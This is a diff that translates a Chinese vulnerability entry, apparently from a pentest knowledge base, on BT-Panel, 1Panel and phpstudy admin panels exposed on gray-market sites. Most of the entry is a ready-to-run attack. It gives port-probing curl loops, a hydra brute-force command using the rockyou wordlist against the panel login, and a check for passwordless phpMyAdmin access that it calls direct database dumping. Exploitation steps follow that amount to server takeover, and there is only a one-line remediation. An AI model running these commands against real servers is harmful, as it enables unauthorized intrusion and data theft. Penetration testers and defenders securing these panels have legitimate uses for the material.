@@ -1,57 +1,57 @@
 ﻿---
-title: 宝塔 / 1Panel 面板弱口令与未授权（黑灰站最常见后台）
-cve: 无（配置缺陷）
+title: BT / 1Panel weak passwords and unauthenticated access (the most common admin panels on black/gray-market sites)
+cve: None (configuration flaw)
 severity: critical
 cvss: 9.2
-product: 宝塔面板（BT-Panel）/ 1Panel / 小皮 phpstudy
-versions: 任意
+product: BT-Panel / 1Panel / Xiaopi phpstudy
+versions: Any
 ports: 8888, 888, 8443, 2087, 9999
-keywords: 宝塔, bt, 1panel, 面板, 弱口令, 未授权, 服务器
-entry: :8888/<随机入口> 或 :8888/login
+keywords: BT-Panel, bt, 1panel, panel, weak passwords, unauthenticated access, server
+entry: :8888/<random-entry-path> or :8888/login
 verified: false
-sources: 公开资料整理（配置缺陷类）
+sources: Compiled from public sources (configuration flaws)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
-GET http://target:8888/        → 宝塔登录页 / 301 到随机入口
-GET http://target:9999/        → 1Panel 登录页
-页面 title/logo 含 BT-Panel / 1Panel
+GET http://target:8888/        → BT login page / 301 to a random entry path
+GET http://target:9999/        → 1Panel login page
+Page title/logo contains BT-Panel / 1Panel
 ```
 
-## 前置条件
+## Prerequisites
 
-- 面板端口对外开放（黑灰站运维常图省事）。
+- Panel ports are publicly accessible (operators of black/gray-market sites often favor convenience).
 
 ## PoC
 
 ```bash
-# 1) 探面板
+# 1) Probe for panels
 for p in 8888 888 8443 2087 9999; do
   echo "== $p"; curl -s -o /dev/null -w '%{http_code}\n' --max-time 4 "http://target:$p/"
 done
 
-# 2) 默认/弱口令（宝塔 6.x 曾默认 admin/随机，7.x 常被改成弱口令）
+# 2) Default/weak passwords (BT 6.x once defaulted to admin/random; 7.x passwords are often changed to weak ones)
 hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
-  '/login:username=^USER^&password=^PASS^:用户名或密码错误'
+  '/login:username=^USER^&password=^PASS^:Incorrect username or password'
 
-# 3) 宝塔常见历史未授权（旧版本 phpmyadmin 目录可直连）
+# 3) Common historical BT unauthenticated access (direct access to the phpmyadmin directory in older versions)
 curl -s -o /dev/null -w '%{http_code}\n' 'http://target:888/pma/'
-# 判定：pma 200 且可无密码进 = 直接拖库
+# Confirmation: pma returns 200 and allows passwordless access = direct database dumping
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先扫端口与登录页（只读）；
-2. 弱口令（10~20 个常见）不行就转 CVE/未授权；
-3. 进面板即可建库、改文件、看计划任务——等于拿下服务器；
-4. 证据：面板 200 + 登录成功页（打码 IP）。
+1. First scan ports and login pages (read-only);
+2. If weak passwords (10–20 common ones) fail, move to CVEs/unauthenticated access;
+3. Panel access allows database creation, file modification, and scheduled-task inspection—effectively server compromise;
+4. Evidence: panel 200 response + successful login page (redact the IP).
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 面板只监听内网/加 IP 白名单；强口令 + 两步验证；关闭 phpmyadmin 直连。
+- Bind panels only to internal interfaces/use an IP allowlist; strong passwords + two-step verification; disable direct phpmyadmin access.
 
-## 参考
+## References
 
-- 宝塔/1Panel 官方安全建议。
+- Official BT/1Panel security recommendations.
